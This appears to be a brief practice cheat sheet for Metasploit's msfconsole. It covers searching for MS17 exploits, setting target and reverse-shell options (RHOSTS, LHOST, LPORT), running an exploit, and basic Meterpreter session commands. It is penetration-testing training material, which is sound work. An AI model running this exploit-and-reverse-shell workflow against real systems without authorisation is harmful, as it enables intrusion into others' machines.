# Practice: Using msfconsole & Modules

## Getting Started

```bash
msfconsole         # Start Metasploit Framework
help               # Show command list
history            # Show previous commands
```

## Searching for Exploits

```bash
search ms17        # Search for MS17-related exploits
use 0              # Select exploit number 0
back               # Exit current module
```

## Working With Modules

```bash
options            # Show required settings
set RHOSTS <IP>    # Set remote host (target)
setg RHOSTS <IP>   # Set globally
set LHOST <IP>     # Local attacker IP
set LPORT <PORT>   # Port for reverse shell
show payloads      # List compatible payloads
info               # Get detailed info about current module
```

## Running an Exploit

```bash
run                # Launch the exploit
```

## Meterpreter Basics

- `pwd`, `ls`, `cd`: Navigate directories
- `sessions`: List active sessions
- `sessions -i <id>`: Interact with a session
- `sysinfo`: Display system information

> 💡 Notes:
> - Meterpreter is a powerful post-exploitation shell with many built-in commands.
> - Always set proper RHOSTS and payload before running exploits.
